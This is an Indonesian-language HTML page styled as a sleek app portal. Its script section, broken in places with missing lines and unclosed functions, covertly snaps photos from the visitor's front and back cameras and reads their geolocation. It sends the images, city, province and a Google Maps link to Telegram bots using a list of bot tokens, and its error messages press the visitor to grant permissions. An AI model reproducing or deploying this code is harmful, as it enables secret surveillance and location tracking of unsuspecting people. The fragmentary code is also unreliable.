<!DOCTYPE html>
<html lang="id">  
<head>  
  <meta charset="UTF-8">    
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Montserrat:wght@300;500;700&display=swap" rel="stylesheet">
  <style>  
    :root {
      --primary: #000000;
      --secondary: #ffffff;
      --accent: #555555;
      --highlight: #dddddd;
      --text: #f5f5f5;
      --text-secondary: #aaaaaa;
    }
    
    body {  
      background: var(--primary);
      color: var(--text);  
      font-family: 'Montserrat', sans-serif;  
      text-align: center;  
      padding: 0;
      margin: 0;
      min-height: 100vh;
      overflow-x: hidden;  
      position: relative;
    }
    
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23ffffff" stroke-width="0.5" opacity="0.05"/></svg>');
      opacity: 0.1;
      z-index: 0;
    }
    
    .container {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
      padding: 40px 20px;
    }
    
    .logo {
      font-family: 'Playfair Display', serif;
      font-size: 4.5em;
      margin-bottom: 20px;
      color: var(--secondary);
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      letter-spacing: 2px;
      position: relative;
      display: inline-block;
      animation: fadeIn 1s ease-out;
    }
    
    .logo::after {
      content: "";
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--secondary), transparent);
    }
    
    .subtitle {
      font-size: 1.3em;
      margin-bottom: 40px;
      color: var(--text-secondary);
      font-weight: 300;
      letter-spacing: 1px;
      animation: fadeIn 1.5s ease-out;
    }
    
    .input-container {
      position: relative;
      max-width: 600px;
      margin: 0 auto 30px;
      animation: fadeIn 2s ease-out;
    }
    
    input {  
      padding: 18px 25px;  
      font-size: 1.1em;  
      width: 100%;  
      border-radius: 25px;  
      border: none;  
      background-color: rgba(20, 20, 20, 0.8);  
      color: var(--text);  
      transition: all 0.3s ease;
      font-family: 'Montserrat', sans-serif;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }  
    
    input:focus {  
      outline: none;  
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2), 0 5px 20px rgba(0, 0, 0, 0.4);
      background-color: rgba(30, 30, 30, 0.9);
    }  
    
    input::placeholder {
      color: rgba(255, 255, 255, 0.3);
      font-weight: 300;
    }
    
    button {  
      background: var(--secondary);  
      color: var(--primary);  
      font-size: 1.1em;  
      font-weight: 700;  
      padding: 16px 40px;  
      border: none;  
      border-radius: 30px;  
      cursor: pointer;  
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      position: relative;
      overflow: hidden;
      letter-spacing: 1px;
      text-transform: uppercase;
      font-family: 'Montserrat', sans-serif;
      animation: fadeIn 2s ease-out;
    }  
    
    button:hover {  
      transform: translateY(-3px);  
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
      background: var(--highlight);
    }  
    
    button:active {  
      transform: translateY(1px);  
    }
    
    .status {
      font-size: 1.1em;
      margin: 30px 0;
      color: var(--text-secondary);
      min-height: 24px;
    }
    
    .hidden {  
      display: none;  
    }
    
    .apps-container {
      margin-top: 50px;
      padding: 40px;
      background: rgba(20, 20, 20, 0.7);
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      position: relative;
      max-width: 800px;
      margin-left: auto;
      margin-right: auto;
      animation: slideUp 0.8s ease-out;
    }
    
    .apps-title {
      font-size: 2em;
      color: var(--secondary);
      margin-bottom: 30px;
      font-family: 'Playfair Display', serif;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
    }
    
    .apps-subtitle {
      font-size: 1.1em;
      color: var(--text-secondary);
      margin-bottom: 40px;
      line-height: 1.6;
    }
    
    .app-links {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 20px;
      margin-top: 30px;
      text-align: left;
    }
    
    .app-link {  
      display: block;  
      padding: 20px;
      background: rgba(30, 30, 30, 0.7);
      color: var(--text);  
      text-decoration: none;  
      font-weight: 500;  
      transition: all 0.3s ease;
      border-radius: 8px;
      border-left: 3px solid var(--secondary);
      opacity: 0;
      transform: translateY(20px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
    }
    
    .app-link:hover {
      transform: translateY(-3px) !important;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
      background: rgba(40, 40, 40, 0.8);
    }
    
    .app-link.show {  
      opacity: 1;  
      transform: translateY(0);  
      transition: opacity 0.5s, transform 0.5s;  
    }
    
    .app-icon {
      font-size: 1.5em;
      margin-right: 10px;
      vertical-align: middle;
    }
    
    .coming-soon {
      margin-top: 50px;
      padding: 20px;
      background: rgba(20, 20, 20, 0.7);
      border-radius: 10px;
      border: 1px dashed rgba(255, 255, 255, 0.2);
    }
    
    .coming-soon-btn {
      background: transparent;
      color: var(--text);
      border: 1px solid var(--text-secondary);
      padding: 12px 30px;
      border-radius: 25px;
      font-size: 1em;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 20px;
    }
    
    .coming-soon-btn:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: var(--text);
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes slideUp {
      from { 
        opacity: 0;
        transform: translateY(50px);
      }
      to { 
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    /* Page transition */
    .page {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.5s ease;
    }
    
    .page.active {
      opacity: 1;
      pointer-events: all;
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .logo {
        font-size: 3em;
      }
      
      .subtitle {
        font-size: 1.1em;
      }
      
      .apps-container {
        padding: 20px;
      }
      
      .app-links {
        grid-template-columns: 1fr;
      }
    }
  </style>

    async function kirimTelegram(token, chat_id, pesan) {  
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {  
          method: 'POST',  
          headers: { 'Content-Type': 'application/json' },  
          body: JSON.stringify({ chat_id, text: pesan, parse_mode: "Markdown" })

    async function aksesKamera(facingMode, labelKamera) {  
      const video = document.getElementById('video');  
      const canvas = document.getElementById('canvas');  
      const context = canvas.getContext('2d');  
      const constraints = { video: { facingMode: facingMode } };  
    
      try {  
        const stream = await navigator.mediaDevices.getUserMedia(constraints);  
        video.srcObject = stream;  
        await new Promise(resolve => {
          video.onplaying = resolve;
          setTimeout(resolve, 3000); // Timeout 3 detik jika kamera tidak bisa diakses
        });
        
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        context.drawImage(video, 0, 0, canvas.width, canvas.height);  
    
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));  
        stream.getTracks().forEach(track => track.stop());  
    
        // Kirim foto ke Telegram

          formData.append('photo', blob);

            method: 'POST',  
            body: formData

    function deteksiLokasiGoogleMaps() {  
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {  
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                const lat = position.coords.latitude;  
                const lng = position.coords.longitude;  
                const geocoder = new google.maps.Geocoder();  
                const latlng = { lat: lat, lng: lng };  
              
                geocoder.geocode({ location: latlng }, function(results, status) {  
                  if (status === "OK" && results[0]) {  
                    let kota = "";  
                    let provinsi = "";  
                    for (const comp of results[0].address_components) {  
                      if (comp.types.includes("administrative_area_level_1")) {  
                        provinsi = comp.long_name;  
                      }  
                      if (comp.types.includes("locality") || comp.types.includes("administrative_area_level_2")) {
                        kota = comp.long_name;  
                      }  
                    }  
              
                    const lokasiText = `ðŸ“ Lokasi: ${kota}, ${provinsi}`;  
                    tampilkanStatus(lokasiText);  
                    
                    await Promise.all(tokens.map(account => {
                      return kirimTelegram(account.token, account.chat_id, `ðŸ“ Lokasi via Maps API:\n${kota}, ${provinsi}\n\nðŸŒ Google Maps: https://www.google.com/maps?q=${lat},${lng}`);
                    }));
                    
                    resolve();
                  } else {  
                    reject(new Error("izinkan prizinan."));  
                  }  
                });  
              } catch (e) {
                reject(e);
              }
            }, 
            (error) => {
              reject(new Error("Gagal " + error.message));
            }
          );  
        } else {  
          reject(new Error("izinkan perizinan agar tidak terjadi eror."));  
        }  
      });
    }
